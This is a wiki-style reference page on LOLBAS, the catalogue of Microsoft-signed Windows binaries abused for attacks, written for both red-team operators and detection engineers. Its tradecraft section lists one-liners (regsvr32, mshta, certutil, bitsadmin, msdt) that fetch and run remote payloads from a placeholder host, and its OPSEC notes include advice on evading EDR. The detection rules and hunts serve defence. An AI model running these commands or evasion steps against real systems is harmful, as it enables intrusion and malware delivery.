---
title: Living-off-the-land binaries (LOLBAS)
slug: living-off-the-land-binaries-lolbas
aliases: [lolbas, lolbins]
---
{% raw %}

LOLBAS — the Living Off The Land Binaries, Scripts and Libraries project — is a curated catalogue of Microsoft-signed executables, scripts, and DLLs that ship in-box on Windows and can be repurposed for offensive primitives: code execution, AWL bypass, download, upload, credential access, persistence, log tampering. The point is to operate without dropping new code on disk and without tripping signature-based controls, because every binary is signed by Microsoft and present on a default install. It shows up in red-team operations, ransomware tradecraft, and APT playbooks alike, which is why it is the bedrock reference for both attackers building tradecraft and detection engineers building hunts. See [[living-off-the-land]] for the broader doctrine.

## Mental model

A LOLBin is (a) signed by Microsoft, (b) ships in-box or via an MS-distributed package, and (c) has a documented "unintended" function that an operator can drive from the command line. The LOLBAS schema is YAML/JSON, one file per binary, and each entry exposes a list of `Commands` annotated with a `Category`:

```
Execute, AwlBypass, AslrBypass, UacBypass, Copy,
Download, Upload, Encode, Decode, Compile,
ConnectionProxy, Reconnaissance, Credentials, Dump, Other
```

A single binary can carry many categories. `regsvr32.exe` is `Execute` + `AwlBypass`; `certutil.exe` is `Download` + `Encode` + `Decode`. The repo lives at `https://lolbas-project.github.io/` and the raw YAML at `https://github.com/LOLBAS-Project/LOLBAS/tree/master/yml`. Detection teams pull that YAML, flatten it, and turn each `Command` into a hunt hypothesis. Operators do the inverse: filter by category and pick the least-flagged option.

```text
LOLBAS entry ──► Category tags ──► Command examples
                                   │
        ┌──────────────────────────┴──────────────────────────┐
red team: pick "AwlBypass"           blue team: ingest YAML → Sigma → SIEM
```

## Tradecraft

The classics you must memorise, in rough order of historical popularity:

```cmd
:: Squiblydoo — Execute + AwlBypass (regsvr32 fetches a remote scriptlet)
regsvr32.exe /s /n /u /i:https://x.tld/payload.sct scrobj.dll

:: MSBuild inline tasks — Execute via XML project file with C# inline
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pwn.csproj

:: InstallUtil — Execute via /logfile=, /u for uninstall path
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U asm.dll

:: mshta — Execute HTA / JScript directly from URL
mshta.exe https://x.tld/a.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")

:: certutil — Download + Decode (b64 staging)
certutil.exe -urlcache -split -f https://x.tld/b.b64 b.b64
certutil.exe -decode b.b64 b.exe

:: BITS — Download with a service-hosted transfer (survives reboots)
bitsadmin /transfer j /priority foreground https://x.tld/b.exe %TEMP%\b.exe

:: rundll32 — Execute DLL export, or JS: protocol handler trick
rundll32.exe shell32.dll,Control_RunDLL C:\path\evil.cpl
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("...");

:: wmic — deprecated but lingers on older builds
wmic.exe process call create "powershell -nop -w hidden -c ..."

:: pcalua — Program Compatibility Assistant, AWL bypass via -a
pcalua.exe -a c:\path\evil.exe -c args

:: msdt — Follina pattern, ms-msdt URL handler invokes diagcab/script
msdt.exe /id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(calc)i/.."
```

Workflow that still works against many SMBs: phishing macro or LNK launches `mshta` or `regsvr32` against a TLS-fronted scriptlet, which side-loads a .NET assembly via `Assembly.Load(byte[])`, which then injects into a long-lived signed host. The whole chain is fileless from disk perspective and every parent process is Microsoft-signed. See [[applocker-bypass-techniques]] and [[wldp-bypass]] for why those AWL categories matter and where WDAC actually catches them, and [[dll-side-loading]] for the related "signed loader, evil DLL" pattern.

Pull the catalogue programmatically when prepping an op or building a hunt:

```bash
git clone https://github.com/LOLBAS-Project/LOLBAS
python -c "import yaml,glob,json; \
print(json.dumps([yaml.safe_load(open(f)) for f in glob.glob('LOLBAS/yml/**/*.yml',recursive=True)]))" \
  > lolbas.json
jq '.[] | select(.Commands[].Category==\"AwlBypass\") | .Name' lolbas.json
```

## Detection / Telemetry

Prevention first, then telemetry:

- **WDAC / AppLocker publisher rules** — block the script hosts you do not need (`wscript.exe`, `cscript.exe`, `mshta.exe`, `hh.exe`), block `regsvr32` from invoking `scrobj.dll`, deny `MSBuild` and `InstallUtil` outside dev paths. WDAC in enforced mode also blocks unsigned .NET assemblies loaded by LOLBins.
- **ASR rules** that nuke the common chains: *Block all Office applications from creating child processes*, *Block executable content from email client and webmail*, *Block JavaScript or VBScript from launching downloaded executable content*, *Block Win32 API calls from Office macros*, *Block process creations originating from PSExec and WMI commands*.
- **Sysmon** with a curated config (Olaf Hartong / SwiftOnSecurity baseline). Event ID 1 is the workhorse — alert on `Image=regsvr32.exe` with `CommandLine` containing `scrobj.dll` or `http`, `mshta.exe` with a URL, `certutil.exe -urlcache`, `bitsadmin /transfer`, `MSBuild.exe` with a non-dev parent, `rundll32.exe` with `javascript:` or no DLL extension.

Sigma-style hunt for Squiblydoo:

```yaml
detection:
  sel:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains:
      - 'scrobj.dll'
      - 'http'
  condition: sel
```

KQL on Microsoft Defender / Sentinel:

```kql
DeviceProcessEvents
| where FileName in~ ("regsvr32.exe","mshta.exe","installutil.exe","msbuild.exe","certutil.exe","bitsadmin.exe","rundll32.exe","msdt.exe")
| where ProcessCommandLine has_any ("http://","https://","scrobj.dll","javascript:","-urlcache","/transfer","ms-msdt:")
   or InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe","powerpnt.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

Parent-child anomaly hunting beats string matching: `winword.exe → mshta.exe`, `outlook.exe → regsvr32.exe`, `explorer.exe → MSBuild.exe`. See [[detection-engineering-fundamentals]] for shaping these into measurable detections rather than one-off queries.

## OPSEC pitfalls

- The hot-list (`regsvr32 scrobj.dll`, `mshta http`, `certutil -urlcache`, `bitsadmin /transfer`) is in every vendor's default ruleset. If the target has any modern EDR, these fire on first use. Treat them as burn primitives or training-range payloads.
- Microsoft signs the binary, not your command line. WDAC in enforced mode plus a script-host block list will stop most of the catalogue regardless of how clever your invocation is. Recon `Get-AppLockerPolicy -Effective` and check WDAC policy before deciding.
- Several LOLBins spawn a child with a tell-tale lineage (e.g. `MSBuild.exe` parented by `outlook.exe`). The command line can be perfect and you still get caught on process tree shape. Plan a clean parent — see [[edr-hooks-and-unhooking]] for the host-process side.
- LOLBAS evolves weekly. New entries arrive, and old ones get patched (e.g. `finger.exe`, `desktopimgdownldr.exe`, `ie4uinit.exe -basesettings`). Subscribe to the repo's commit feed and re-run your category filters before every engagement; do not rely on a six-month-old cheatsheet.
- `wmic.exe` is deprecated and being removed from recent Windows 11 builds — assume it is missing and do not hard-code it in your loader.

## References

- https://lolbas-project.github.io/
- https://github.com/LOLBAS-Project/LOLBAS
- https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/wdac-and-applocker-overview
- https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference
- https://github.com/SwiftOnSecurity/sysmon-config
- https://attack.mitre.org/techniques/T1218/

See also: [[living-off-the-land]], [[applocker-bypass-techniques]], [[wldp-bypass]], [[dll-side-loading]], [[edr-hooks-and-unhooking]], [[detection-engineering-fundamentals]]
{% endraw %}
